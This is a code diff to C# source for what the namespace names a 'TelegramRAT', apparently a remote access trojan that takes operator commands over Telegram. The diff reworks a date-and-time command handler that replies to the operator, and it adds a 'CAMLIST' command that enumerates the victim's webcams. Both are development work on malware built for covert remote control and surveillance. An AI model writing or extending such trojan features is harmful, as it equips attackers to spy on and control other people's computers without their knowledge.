@@ -1497,27 +1497,44 @@ namespace TelegramRAT
                         }
                         break;
                     }
-                case "CHANGEDATETIME":
-                    {
-                        string year, month, day, hour, minute, second;
-                        // Check if args exists
-                        try { 
-                            
-                            year = args[1];
-                            month = args[2];
-                            day = args[3];
-                            hour = args[4];
-                            minute = args[5];
-                            second = args[6];
-                        }
-                        catch (IndexOutOfRangeException)
-                        {
-                            telegram.sendText("⛔ Arguments <year> <month> <day> <hour> <minute> <second> are required for /ChangeDateTime");
-                            break;
-                        }
-                        DateTime newDateTime = new DateTime(2023, 7, 14, 10, 30, 0);
-                        break;
-                    }
+            case "CHANGEDATETIME":
+                 {
+                     string year, month, day, hour, minute, second;
+                     // Check if args exists
+                     try
+                     {
+                         year = args[1];
+                         month = args[2];
+                         day = args[3];
+                         hour = args[4];
+                         minute = args[5];
+                         second = args[6];
+                     }
+                     catch (IndexOutOfRangeException)
+                     {
+                         telegram.sendText("⛔ Arguments <year> <month> <day> <hour> <minute> <second> are required for /ChangeDateTime");
+                         break;
+                     }
+
+                     try
+                     {
+                         DateTime newDateTime = new DateTime(
+                             int.Parse(year),
+                             int.Parse(month),
+                             int.Parse(day),
+                             int.Parse(hour),
+                             int.Parse(minute),
+                             int.Parse(second)
+                         );
+                         telegram.sendText($"🕒 Date and time changed to: {newDateTime}");
+                     }
+                     catch (Exception ex)
+                     {
+                         telegram.sendText($"⛔ Error in parsing date and time: {ex.Message}");
+                     }
+
+                     break;
+                 }
                 case "SETRANDOMCURPOS":
                     {
                         string durationMs;
@@ -1847,7 +1864,11 @@ namespace TelegramRAT
                                 return false;
                         }
                     }
-
+                case "CAMLIST":
+                    {
+                        utils.webcamList();
+                        break;
+                    }
                 // Unknown command
                 default:
                     {
